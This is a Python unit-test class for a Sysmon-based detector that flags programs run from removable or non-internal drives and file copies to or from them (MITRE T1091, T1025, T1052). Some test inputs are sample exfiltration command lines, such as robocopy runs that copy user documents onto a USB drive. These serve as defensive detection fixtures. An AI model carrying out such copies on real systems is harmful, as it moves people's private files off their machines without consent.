    """Drives that are not this machine's own disks.

    Invariants: an internal disk is never reported; a drive's kind comes from
    Windows or is said to be unknown, never guessed; Windows is asked at most
    once a run and only when a process names a drive not known to be internal;
    a failed read keeps the last good inventory and is reported, not read as
    clean; a replay never asks; file names on a drive are never quoted.
    """

    def drive_findings(self, events, **kw):
        return [f for f in sysmon.audit(events=events, **kw)
                if set(f.get("techniques") or ()) & {"T1091", "T1025", "T1052"}]

    def live(self, store, events, read):
        data = {"events": events, "complete": True, "rareComplete": True}
        with mock.patch.object(sysmon, "_native", return_value=(data, 7)), \
                mock.patch.object(sysmon, "_read_volumes", side_effect=read) as asked:
            return sysmon.audit(store=store, incremental=True), asked

    def test_drive_kind_comes_from_type_and_bus(self):
        kind = techniques.volume_kind
        self.assertEqual(kind("C", DRIVES), techniques.INTERNAL)
        self.assertEqual(kind("e", DRIVES), techniques.REMOVABLE)
        self.assertEqual(kind("F", DRIVES), techniques.REMOVABLE)      # a USB disk calls itself fixed
        self.assertEqual(kind("Z", DRIVES), techniques.OTHER)
        self.assertEqual(kind("G", DRIVES), techniques.DETACHED)
        self.assertEqual(kind("C", {"C": ("Fixed", "")}), techniques.INTERNAL)
        for path, letter in ((r"e:\x.exe", "E"), ('"E:/x.exe"', "E"), (r"\\srv\share\x.exe", ""),
                             ("System", ""), ("", ""), (None, ""), ("HKLM:\\x", "")):
            self.assertEqual(techniques.drive_letter(path), letter, path)

    def test_copy_direction(self):
        ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        cmd = r"C:\Windows\System32\cmd.exe"
        for image, cmdline, want in (
                (ROBOCOPY, r"robocopy C:\Users\a\Documents E:\backup /E", ({"C"}, "E")),
                (ROBOCOPY, r"robocopy E:\ C:\Users\a\in /E", ({"E"}, "C")),
                ("xcopy.exe", r"xcopy /s F:\photos C:\Users\a\Pictures", ({"F"}, "C")),
                (cmd, r"C:\Windows\System32\cmd.exe /c copy report.txt E:" + "\\", (set(), "E")),
                (cmd, r"cmd /c copy E:\secret.doc", ({"E"}, "")),
                (cmd, r'cmd /c copy "C:\a b\x.doc" "E:\out"', ({"C"}, "E")),
                (ps, r"powershell -c Copy-Item -Destination E:\x -Path C:\Users\a\d", ({"C"}, "E")),
                (ps, r"powershell -c Copy-Item E:\x C:\Users\a\d", ({"E"}, "C")),
                # Not copies: a listing, the shell's own path, a tool that is not a copy tool.
                (ps, ps + r" -c Get-ChildItem E:" + "\\", (set(), "")),
                (cmd, r"cmd /c dir E:" + "\\", (set(), "")),
                ("notepad.exe", r"notepad copy E:\a", (set(), "")),
                (ROBOCOPY, "robocopy", (set(), ""))):
            self.assertEqual(techniques.copy_drives(image, cmdline), want, cmdline)

    def test_only_drives_that_are_not_internal_disks_are_reported(self):
        for image in (r"E:\tools\setup.exe", r"F:\portable\app.exe", r"G:\autorun.exe"):
            self.assertTrue(self.drive_findings([start(image)], volumes=DRIVES), image)
        for image in (r"C:\Program Files\App\app.exe", r"D:\Games\game.exe", r"Z:\share\tool.exe",
                      r"\\srv\share\tool.exe", "System"):
            self.assertEqual(self.drive_findings([start(image)], volumes=DRIVES), [], image)
        gone = self.drive_findings([start(r"G:\autorun.exe")], volumes=DRIVES)[0]
        self.assertIn("no longer attached", gone["title"])
        self.assertIn("network drive or a mounted disk image", gone["detail"])   # not called a stick
        self.assertEqual(gone["severity"], "medium")

    def test_a_copy_is_reported_by_direction_without_file_names(self):
        out = self.drive_findings([start(ROBOCOPY, r"robocopy C:\Users\a\Taxes2026 E:\Hidden /E")],
                                  volumes=DRIVES)
        self.assertEqual([f["techniques"] for f in out], [["T1052"]])
        back = self.drive_findings([start(ROBOCOPY, r"robocopy E:\Payroll C:\Users\a\in")],
                                   volumes=DRIVES)
        self.assertEqual([f["techniques"] for f in back], [["T1025"]])
        for f in out + back:
            self.assertEqual(f["severity"], "low")
            for private in ("Taxes2026", "Hidden", "Payroll"):
                self.assertNotIn(private, json.dumps(f))
        self.assertEqual(self.drive_findings(
            [start(ROBOCOPY, r"robocopy C:\Users\a\Documents D:\backup /E")], volumes=DRIVES), [])

    def test_a_replay_never_asks_windows_and_leaves_drives_unjudged(self):
        with mock.patch.object(sysmon, "_read_volumes") as asked, \
                mock.patch.object(sysmon, "ps_json") as ps:
            out = sysmon.audit(events=[start(r"E:\tools\setup.exe")])
            self.assertTrue(self.drive_findings([start(r"E:\tools\setup.exe")], volumes=DRIVES))
        asked.assert_not_called()
        ps.assert_not_called()
        self.assertEqual([f for f in out if f["severity"] != "ok"], [])

    def test_windows_is_asked_once_and_only_for_a_drive_not_known_to_be_internal(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = Store(os.path.join(tmp, "v.db"))
            try:
                usual = [start(r"C:\Windows\System32\whoami.exe"), start(r"C:\Windows\explorer.exe")]
                # First run: nothing is known, so the inventory is read once and kept.
                out, asked = self.live(store, usual, [dict(DRIVES)])
                self.assertEqual(asked.call_count, 1)
                self.assertEqual(self.tagged_drives(out), [])
                self.assertEqual(sysmon._known_volumes(store)[0]["F"], ("Fixed", "USB"))
                # Ordinary runs after that cost nothing, however many events they carry.
                out, asked = self.live(store, usual * 50 + [start(r"D:\Games\game.exe")], [])
                asked.assert_not_called()
                # A drive not known to be internal: asked once for the whole run.
                sticks = [start(r"E:\a.exe"), start(r"E:\b.exe"), start(r"G:\c.exe"),
                          start(ROBOCOPY, r"robocopy C:\Users\a\d E:\out")]
                out, asked = self.live(store, usual + sticks, [dict(DRIVES)])
                self.assertEqual(asked.call_count, 1)
                self.assertEqual(sorted(t for f in self.tagged_drives(out) for t in f["techniques"]),
                                 ["T1052", "T1091", "T1091", "T1091"])
                # What is known expires: an old inventory is read again.
                saved = json.loads(store.get_meta(sysmon.VOLUMES_META, ""))
                saved["at"] = time.time() - sysmon.VOLUMES_FOR_S - 1
                store.set_meta(sysmon.VOLUMES_META, json.dumps(saved))
                out, asked = self.live(store, usual, [dict(DRIVES)])
                self.assertEqual(asked.call_count, 1)
            finally:
                store.close()

    def tagged_drives(self, findings):
        """Drive findings of a stored run, which come back by title, as [{techniques: [tid]}]."""
        return [{"techniques": [tid]} for f in findings
                for tid in ("T1091", "T1025", "T1052") if f["title"].endswith(f"({tid})")]

    def test_a_failed_read_is_said_and_keeps_the_last_good_inventory(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = Store(os.path.join(tmp, "f.db"))
            try:
                self.live(store, [start(r"C:\Windows\explorer.exe")], [dict(DRIVES)])
                saved = json.loads(store.get_meta(sysmon.VOLUMES_META, ""))
                saved["at"] = time.time() - sysmon.VOLUMES_FOR_S - 1        # stale, and Windows is silent
                store.set_meta(sysmon.VOLUMES_META, json.dumps(saved))
                events = [start(r"C:\Windows\explorer.exe"), start(r"D:\Games\game.exe"),
                          start(r"E:\tools\setup.exe")]
                out, asked = self.live(store, events, [None])
                self.assertEqual(asked.call_count, 1)                       # no retry storm
                self.assertEqual(self.tagged_drives(out), [])               # nothing guessed
                unread = [f for f in out if f["title"] == "drive types could not be read"]
                self.assertEqual(len(unread), 1)
                self.assertEqual(unread[0]["severity"], "low")
                self.assertTrue(unread[0]["detail"].startswith("1 process events"))   # only E:, not C: or D:
                self.assertIn("not a clean result", unread[0]["detail"])
                self.assertEqual(json.loads(store.get_meta(sysmon.VOLUMES_META, "")), saved)
                # With no inventory at all and Windows silent, every drive is unread, none judged.
                store.set_meta(sysmon.VOLUMES_META, "not json")
                out, _ = self.live(store, events, [None])
                self.assertEqual(self.tagged_drives(out), [])
                self.assertTrue(any(f["title"] == "drive types could not be read" for f in out))
                # Windows answers again: the same events are judged on the next run.
                out, _ = self.live(store, events, [dict(DRIVES)])
                self.assertEqual([f["techniques"] for f in self.tagged_drives(out)], [["T1091"]])
                self.assertFalse(any(f["title"] == "drive types could not be read" for f in out))
            finally:
                store.close()

    def test_an_empty_or_malformed_inventory_is_a_failed_read(self):
        for answer in (None, {}, {"volumes": []}, {"volumes": "x"}, [1], {"volumes": [{"type": "Fixed"}]}):
            with mock.patch.object(sysmon, "ps_json", return_value=answer):
                self.assertIsNone(sysmon._read_volumes(), answer)
        one = {"volumes": {"letter": "c", "type": "Fixed", "bus": "NVMe"}}        # one drive: not a list
        with mock.patch.object(sysmon, "ps_json", return_value=one):
            self.assertEqual(sysmon._read_volumes(), {"C": ("Fixed", "NVMe")})

    def test_removable_media_is_held_until_a_real_drive_has_exercised_it(self):
        for tid in ("T1091", "T1025", "T1052"):
            fired, what = attackmap.PROBES[tid][0]()
            self.assertTrue(fired, f"{tid}: {what}")
            self.assertEqual(attackmap.PROBES[tid][1], ("sysmon",))
            self.assertIn(tid, attackmap.CONTEXT_ONLY)
            self.assertGreater(len(attackmap.HELD[tid]), 20)
        self.assertNotIn("T1092", attackmap.PROBES)                     # nothing looks for it: blind
